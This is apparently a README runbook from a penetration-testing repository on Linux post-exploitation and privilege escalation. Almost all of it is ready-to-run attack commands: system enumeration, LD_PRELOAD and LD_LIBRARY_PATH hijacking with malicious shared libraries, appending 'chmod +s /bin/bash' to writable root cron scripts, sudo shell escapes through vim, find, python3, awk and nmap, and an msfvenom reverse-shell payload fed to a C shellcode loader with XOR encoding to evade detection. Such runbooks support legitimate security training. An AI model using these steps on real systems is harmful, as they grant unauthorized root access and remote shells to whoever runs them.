# Linux Post-Exploitation Runbook

---

## Privilege Escalation Decision Tree

```
What do I have?
├── Writable cron job running as root → inject command
├── SUID binary writable or exploitable → GTFOBins
├── Writable script called by root cron → overwrite it
├── LD_PRELOAD in /etc/environment or sudo → shared lib injection
│   └── 08-linux/loaders/sharedLibrary_LD_PRELOAD.c
├── Weak sudo rule → sudo -l, check GTFOBins
└── Kernel exploit → uname -r, searchsploit
```

---

## Enumeration

```bash
# Who am I, what do I have
id; whoami; groups
sudo -l                         # what can I run as sudo?
uname -a                        # kernel version

# SUID binaries
find / -perm -u=s -type f 2>/dev/null

# World-writable files and dirs
find / -writable -not -path "/proc/*" -not -path "/sys/*" 2>/dev/null | head -20

# Cron jobs (all users)
cat /etc/crontab
ls -la /etc/cron*
cat /var/spool/cron/crontabs/* 2>/dev/null

# Processes running as root
ps aux | grep root

# Network listeners
ss -tlnp; netstat -tlnp

# Check /etc/passwd for interesting users
cat /etc/passwd | grep -v nologin | grep -v false
```

---

## LD_PRELOAD Privilege Escalation

```bash
# If sudo -l shows: env_keep+=LD_PRELOAD or any sudo entry
# Compile malicious shared library
gcc -fPIC -shared -o /tmp/evil.so 08-linux/loaders/sharedLibrary_LD_PRELOAD.c -nostartfiles
# Run sudo command with LD_PRELOAD
sudo LD_PRELOAD=/tmp/evil.so <WHITELISTED_SUDO_COMMAND>
# → drops to root shell
```

---

## LD_LIBRARY_PATH Privilege Escalation

```bash
# If sudo preserves LD_LIBRARY_PATH and binary loads a lib you can replace
# Find libraries the binary loads
ldd $(which <PROGRAM>)
# Place malicious .so with same name in a dir earlier in LD_LIBRARY_PATH
gcc -fPIC -shared -o /tmp/<LIB_NAME>.so 08-linux/loaders/sharedLibrary_LD_LIBRARY_PATH.c -nostartfiles
sudo LD_LIBRARY_PATH=/tmp <WHITELISTED_SUDO_COMMAND>
```

---

## Shellcode Runner (C)

```bash
# Simple C shellcode loader
# Generate shellcode: msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f c
# Paste shellcode into simpleLoader.c
gcc -o loader loaders/simpleLoader.c
./loader

# With XOR encoding (simpleXORencoder.c)
# First XOR-encode your shellcode, paste into loader, then:
gcc -o loader loaders/simpleXORencoder.c
./loader
```

---

## Common Cron Injection

```bash
# Find cron script running as root that you can write to
ls -la /usr/local/bin/*.sh
echo "chmod +s /bin/bash" >> /path/to/writable_cron_script.sh
# Wait for cron to execute, then:
/bin/bash -p    # -p preserves SUID
```

---

## Weak sudo Rules

```bash
# Check
sudo -l

# Common exploitable rules:
sudo vim → :!/bin/bash
sudo less /etc/passwd → !bash
sudo find → sudo find / -exec /bin/bash \;
sudo python3 → sudo python3 -c "import os; os.system('/bin/bash')"
sudo awk → sudo awk 'BEGIN {system("/bin/bash")}'
sudo nmap → sudo nmap --interactive → !bash  (older nmap)
```

**GTFOBins:** https://gtfobins.github.io/

---

## Files in This Section

| File | Purpose |
|------|---------|
| `loaders/simpleLoader.c` | Basic shellcode runner in C |
| `loaders/simpleXORencoder.c` | XOR-encoded shellcode runner |
| `loaders/sharedLibrary_LD_PRELOAD.c` | LD_PRELOAD shared lib for priv esc |
| `loaders/sharedLibrary_LD_LIBRARY_PATH.c` | LD_LIBRARY_PATH shared lib |
| `privesc/` | Linux privesc tools (linpeas, pspy) |
